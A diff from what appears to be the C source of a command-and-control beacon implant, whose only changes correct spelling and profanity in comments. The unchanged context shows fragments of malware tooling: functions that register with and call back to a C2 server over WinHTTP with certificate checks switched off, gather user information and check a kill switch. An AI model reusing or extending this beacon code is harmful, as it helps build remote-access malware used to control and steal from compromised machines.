@@ -33,7 +33,7 @@
 BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
 {
 
-    /* get basic infomation about how the current user is running */
+    /* get basic information about how the current user is running */
 
     DWORD dwUserBuf = 256;
     char chCurrentUser[256];
@@ -171,7 +171,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     if (!hSession)
     {
-        // not really alot we can do about this, guess we just return and try again later...
+        // not really a lot we can do about this, guess we just return and try again later...
         return FALSE;
     }
 
@@ -196,7 +196,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
@@ -231,7 +231,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         {
             if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
             {
-                // Theres no data avalible
+                // Theres no data available
                 DEBUG("WinHttpQueryDataAvailable error\n");
                 return FALSE;
             }
@@ -252,14 +252,14 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     WinHttpCloseHandle(hSession);
     WinHttpCloseHandle(hConnect);
 
-    // now its time to parse the json data in the responce
+    // now its time to parse the json data in the response
     parsed_json = json_tokener_parse(ReadBuffer);
 
     // get the id and store it in the idbuffer
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
 
-    // now check we dont need to kill ourselves
+    // now check we don't need to kill ourselves
     CheckIfDie(&ReadBuffer);
 
     return TRUE;
@@ -284,7 +284,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     {
     case MODE_CHECKIN_NO_DATA:
 
-        // dont add any data
+        // don't add any data
         break;
 
     case MODE_CHECKIN_DATA:
@@ -299,7 +299,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
         break;
     }
 
-    // return the formated data
+    // return the formatted data
     return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
 }
 
@@ -332,7 +332,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     if (!hSession)
     {
-        // not really alot we can do about this, guess we just return and try again later...
+        // not really a lot we can do about this, guess we just return and try again later
         return FALSE;
     }
 
@@ -357,7 +357,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
 
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
@@ -443,7 +443,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
                 asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
             }
 
-            // free the memory allocated to the buffer.
+            // free the memory allocated to the buffer
 
             free(pszOutBuffer);
 
